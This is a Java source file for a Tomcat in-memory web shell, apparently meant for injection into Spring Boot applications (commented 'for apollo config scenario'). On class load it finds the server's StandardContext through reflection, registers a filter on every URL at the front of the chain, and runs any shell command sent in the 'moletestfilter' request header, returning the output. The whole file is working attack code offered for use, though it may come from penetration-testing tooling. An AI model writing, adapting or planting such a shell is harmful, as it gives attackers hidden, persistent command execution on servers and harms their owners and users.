import org.apache.catalina.Service;
import org.apache.catalina.core.*;
import org.apache.catalina.startup.Tomcat;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.springframework.boot.web.embedded.tomcat.TomcatWebServer;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

/**
 * for apollo config scenario
 */
public class FilterMemShell3 implements Filter {
    static {
        new FilterMemShell3();
    }

    public FilterMemShell3() {
        try {
            StandardContext stdCtx = getContext();

            //1.添加filterDef
            FilterMemShell3 filterMemShell = new FilterMemShell3("abc");
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterClass("FilterMemShell3");
            filterDef.setFilterName(filterMemShell.getClass().getName());
            filterDef.setFilter(filterMemShell);
            stdCtx.addFilterDef(filterDef);
            //根据filterDefs重新生成filterConfig
            stdCtx.filterStart();
            //2.添加filterMap
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(filterMemShell.getClass().getName());
            filterMap.setDispatcher("REQUEST");
            filterMap.addURLPattern("/*");
            stdCtx.addFilterMap(filterMap);
            //3.将自定义filter移动到filterMaps数组的第0位置
            //  [这步非必要，只是为了提高FilterChain的处理顺序]
            FilterMap[] filterMaps = stdCtx.findFilterMaps();
            FilterMap[] tmpFilterMaps = new FilterMap[filterMaps.length];
            int idx = 1;
            for (int i = 0; i < filterMaps.length; i++) {
                FilterMap tmpFilter = filterMaps[i];
                if (tmpFilter.getFilterName().equalsIgnoreCase(filterMemShell.getClass().getName())) {
                    tmpFilterMaps[0] = tmpFilter;
                } else {
                    tmpFilterMaps[idx++] = tmpFilter;
                }
            }
            for (int i = 0; i < filterMaps.length; i++) {
                filterMaps[i] = tmpFilterMaps[i];
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public FilterMemShell3(String anyStr) {
    }

    private StandardContext getContext() {
        try {
            Method m = Thread.class.getDeclaredMethod("getThreads");
            m.setAccessible(true);
            Thread[] ts = (Thread[]) m.invoke(null);

            for (int i = 0; i < ts.length; i++) {
                try {
                    Field this$0 = ts[i].getClass().getDeclaredField("this$0");
                    this$0.setAccessible(true);
                    TomcatWebServer tws = (TomcatWebServer) this$0.get(ts[i]);
                    Tomcat tomcat = tws.getTomcat();
                    StandardServer server = (StandardServer) tomcat.getServer();
                    Field services = server.getClass().getDeclaredField("services");
                    services.setAccessible(true);
                    Object o = services.get(server);
                    Service[] sArr = (Service[]) o;
                    StandardService ss = (StandardService) sArr[0];
                    Field engine = ss.getClass().getDeclaredField("engine");
                    engine.setAccessible(true);
                    StandardEngine se = (StandardEngine) engine.get(ss);
                    Field children = se.getClass().getSuperclass().getDeclaredField("children");
                    children.setAccessible(true);
                    HashMap o1 = (HashMap) children.get(se);
                    StandardHost o2 = (StandardHost) o1.get("localhost");
                    Field children1 = o2.getClass().getSuperclass().getDeclaredField("children");
                    children1.setAccessible(true);
                    HashMap o3 = (HashMap) children1.get(o2);
                    StandardContext o4 = (StandardContext) o3.get("");
                    return o4;
                } catch (Exception ex) {
                }
            }
        } catch (Exception e) {
        }

        return null;
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
        String scode = ((HttpServletRequest)request).getHeader("moletestfilter");
        if (scode != null && !"".equals(scode.trim())) {
            try {
                PrintWriter writer = response.getWriter();
                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", scode});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", scode});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();

                //直接return后，就不再继续走到下一个Filter以及接口实现了
                return;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        filterChain.doFilter(request, response);
    }
}
